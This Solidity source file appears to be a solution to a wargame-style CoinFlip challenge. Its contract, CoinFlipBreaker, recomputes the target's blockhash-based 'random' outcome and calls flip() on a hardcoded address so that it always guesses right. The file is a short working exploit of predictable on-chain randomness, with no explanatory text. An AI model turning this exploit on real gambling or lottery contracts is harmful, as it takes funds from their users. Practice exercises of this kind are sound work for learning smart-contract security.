pragma solidity ^0.5.0;

import 'https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/ownership/Ownable.sol';

contract CoinFlipInterface {
     function flip(bool _guess) public returns (bool);
}

contract CoinFlipBreaker is Ownable {
  CoinFlipInterface coinflipContract = CoinFlipInterface(address(0x53bbF7005f13843068828eC0062B23A12898fFCe));
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
  }

  function guessFlip() public {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    coinflipContract.flip.gas(40000)(side);
  }

  function destroy() external onlyOwner {
      selfdestruct(msg.sender);
  }
}
